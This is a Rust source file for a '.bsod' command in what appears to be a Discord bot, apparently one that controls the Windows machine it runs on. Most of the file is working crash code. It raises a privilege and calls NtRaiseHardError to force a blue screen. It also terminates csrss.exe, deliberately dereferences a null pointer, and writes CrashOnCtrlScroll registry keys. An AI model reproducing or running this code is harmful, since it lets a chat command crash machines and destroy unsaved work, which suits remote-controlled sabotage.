use crate::commands::Arguments;
use crate::commands::BotCommand;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::component::{ActionRow, Button, ButtonStyle};
use twilight_model::channel::message::embed::EmbedField;
use twilight_model::channel::message::Component;
use twilight_model::channel::message::Message;
use twilight_util::builder::embed::{EmbedBuilder, EmbedFooterBuilder};

pub struct BsodCommand;

pub const BSOD_CONFIRM_BUTTON: &str = "bsod_confirm_trigger";
pub const BSOD_CANCEL_BUTTON: &str = "bsod_cancel_trigger";

#[async_trait]
impl BotCommand for BsodCommand {
    fn name(&self) -> &str { "bsod" }
    fn description(&self) -> &str { "Trigger Blue Screen of Death" }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".bsod" }
    fn examples(&self) -> &'static [&'static str] { &[".bsod"] }
    fn aliases(&self) -> &'static [&'static str] { &["bluescreen", "crash"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        _args: Arguments,
    ) -> Result<()> {
        let embed = EmbedBuilder::new()
            .title("Blue screen trigger")
            .description("Are you sure you want to continue?")
            .color(0xE74C3C)
            .field(EmbedField {
                name: "Timeout".to_string(),
                value: "This confirmation expires in 30 seconds".to_string(),
                inline: false,
            })
            .footer(EmbedFooterBuilder::new("Kurinium BSOD Module"))
            .build();

        let confirm_button = Button {
            custom_id: Some(BSOD_CONFIRM_BUTTON.to_string()),
            disabled: false,
            emoji: None,
            label: Some("Trigger".to_string()),
            style: ButtonStyle::Danger,
            url: None,
            sku_id: None,
        };

        let cancel_button = Button {
            custom_id: Some(BSOD_CANCEL_BUTTON.to_string()),
            disabled: false,
            emoji: None,
            label: Some("Cancel".to_string()),
            style: ButtonStyle::Secondary,
            url: None,
            sku_id: None,
        };

        let action_row = Component::ActionRow(ActionRow {
            components: vec![
                Component::Button(confirm_button),
                Component::Button(cancel_button),
            ],
        });

        http.create_message(msg.channel_id)
            .embeds(&[embed])
            .components(&[action_row])
            .await?;

        Ok(())
    }
}

impl BsodCommand {
    pub fn trigger_bsod() -> Result<(), String> {
        trigger_bsod_windows()
    }
}

fn trigger_bsod_windows() -> Result<(), String> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr::null_mut;

    // Load ntdll.dll
    let ntdll_name: Vec<u16> = OsStr::new("ntdll.dll")
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let ntdll = unsafe { 
        winapi::um::libloaderapi::GetModuleHandleW(ntdll_name.as_ptr()) 
    };

    if ntdll.is_null() {
        return Err("Failed to load ntdll.dll".to_string());
    }

    // Get RtlAdjustPrivilege
    let rtl_adjust = unsafe {
        winapi::um::libloaderapi::GetProcAddress(
            ntdll,
            b"RtlAdjustPrivilege\0".as_ptr() as *const i8,
        )
    };

    if rtl_adjust.is_null() {
        return Err("Failed to get RtlAdjustPrivilege".to_string());
    }

    // Get NtRaiseHardError
    let nt_raise = unsafe {
        winapi::um::libloaderapi::GetProcAddress(
            ntdll,
            b"NtRaiseHardError\0".as_ptr() as *const i8,
        )
    };

    if nt_raise.is_null() {
        return Err("Failed to get NtRaiseHardError".to_string());
    }

    // Function signatures
    type RtlAdjustPrivilegeFn = unsafe extern "system" fn(
        privilege: u32,
        enable: u8,
        current_thread: u8,
        enabled: *mut u8,
    ) -> i32;

    type NtRaiseHardErrorFn = unsafe extern "system" fn(
        error_status: u32,
        number_of_parameters: u32,
        unicode_string_parameter_mask: u32,
        parameters: *mut usize,
        valid_response_options: u32,
        response: *mut u32,
    ) -> i32;

    unsafe {
        let rtl_adjust_privilege: RtlAdjustPrivilegeFn = std::mem::transmute(rtl_adjust);
        let nt_raise_hard_error: NtRaiseHardErrorFn = std::mem::transmute(nt_raise);

        // Enable SeShutdownPrivilege (19)
        let mut enabled: u8 = 0;
        let status = rtl_adjust_privilege(19, 1, 0, &mut enabled);
        
        if status != 0 {
            return Err(format!("RtlAdjustPrivilege failed: 0x{:X}", status));
        }

        // STATUS_ASSERTION_FAILURE = 0xC0000420
        let mut response: u32 = 0;
        nt_raise_hard_error(
            0xC0000420,  // Error status
            0,           // Number of parameters
            0,           // Unicode string mask
            null_mut(),  // Parameters
            6,           // OptionShutdownSystem
            &mut response,
        );

        Err("NtRaiseHardError did not trigger BSOD".to_string())
    }
}

pub mod alternative {
    use std::ptr::null_mut;
    pub fn kill_csrss() -> Result<(), String> {
        use sysinfo::{ProcessExt, System, SystemExt, PidExt};
        
        let mut sys = System::new_all();
        sys.refresh_processes();

        for (pid, process) in sys.processes() {
            if process.name().to_lowercase() == "csrss.exe" {
                unsafe {
                    let handle = winapi::um::processthreadsapi::OpenProcess(
                        winapi::um::winnt::PROCESS_TERMINATE,
                        0,
                        pid.as_u32(),
                    );
                    
                    if !handle.is_null() {
                        winapi::um::processthreadsapi::TerminateProcess(handle, 1);
                        winapi::um::handleapi::CloseHandle(handle);
                        return Ok(());
                    }
                }
            }
        }

        Err("Could not find or kill csrss.exe".to_string())
    }

    pub fn corrupt_memory() -> Result<(), String> {
        unsafe {
            let ptr: *mut u8 = null_mut();
            std::ptr::write_volatile(ptr, 0);
        }
        Err("Memory corruption failed".to_string())
    }

    pub fn setup_crash_on_ctrl_scroll() -> Result<(), String> {
        use winreg::enums::*;
        use winreg::RegKey;

        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        
        if let Ok(key) = hklm.create_subkey("SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters") {
            let _ = key.0.set_value("CrashOnCtrlScroll", &1u32);
        }

        if let Ok(key) = hklm.create_subkey("SYSTEM\\CurrentControlSet\\Services\\kbdhid\\Parameters") {
            let _ = key.0.set_value("CrashOnCtrlScroll", &1u32);
        }

        Ok(())
    }
}